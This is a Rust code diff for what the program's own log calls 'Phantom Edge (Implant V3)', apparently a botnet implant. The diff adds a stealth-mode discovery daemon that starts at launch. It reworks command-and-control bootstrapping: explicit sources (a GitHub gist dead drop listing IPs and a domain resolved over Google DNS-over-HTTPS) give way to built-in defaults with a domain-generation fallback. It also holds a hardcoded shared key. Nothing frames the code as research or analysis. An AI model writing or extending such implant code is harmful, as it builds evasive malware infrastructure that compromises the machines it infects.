@@ -4,6 +4,7 @@ mod modules; // Import new modules
 
 use client::PolyMqttClient;
 use modules::election::{ElectionService, NodeRole};
+use modules::zero_noise_discovery::ZeroNoiseDiscovery;
 use modules::bridge::BridgeService;
 use log::{info, error, warn, debug};
 use std::collections::HashSet;
@@ -58,6 +59,13 @@ async fn main() {
     env_logger::init();
     info!("Phantom Edge (Implant V3) Started - LAN Clustering Mode");
 
+    // 0. Start Zero Noise Discovery Daemon (Stealth Mode)
+    let stealth_disc = Arc::new(ZeroNoiseDiscovery::new());
+    let stealth_clone = stealth_disc.clone();
+    tokio::spawn(async move {
+        stealth_clone.run_daemon().await;
+    });
+
     // 1. Election / Discovery Phase
     let election = Arc::new(ElectionService::new().await);
     let role = election.run_discovery().await;
@@ -82,19 +90,13 @@ async fn run_leader_mode(election: Arc<ElectionService>) {
     // Master Key (Shared Secret) - In prod use real key
     let master_key = [0x42; 32]; 
 
-    // Bootstrapping Phase (Professional/Parallel)
-    let mut bootstrapper = bootstrapper::ProfessionalBootstrapper::new();
-
-    // 1. Add Dead Drop Sources
-    bootstrapper.add_provider(std::sync::Arc::new(bootstrapper::HttpProvider {
-        url: "https://gist.githubusercontent.com/phantom-bot/dead-drop/raw/ips.txt".to_string()
-    }));
-
-    // 2. Add DoH Sources
-    bootstrapper.add_provider(std::sync::Arc::new(bootstrapper::DohProvider {
-        domain: "dht.polydevs.uk".to_string(), // Real DoH Domain
-        resolver_url: "https://dns.google/resolve".to_string(),
-    }));
+    // Bootstrapping Phase (Professional/Tiered)
+    // ProfessionalBootstrapper::new() now automatically configures:
+    // 1. Primary: dht.polydevs.uk (DoH-Google)
+    // 2. Fallback: DGA (DoH-Google)
+    let bootstrapper = bootstrapper::ProfessionalBootstrapper::new();
+    // Use manual add_provider only for custom/dead-drops if needed.
+    // e.g. bootstrapper.add_provider(...)
 
     // 3. Resolve (Race)
     let swarm_nodes = match bootstrapper.resolve().await {
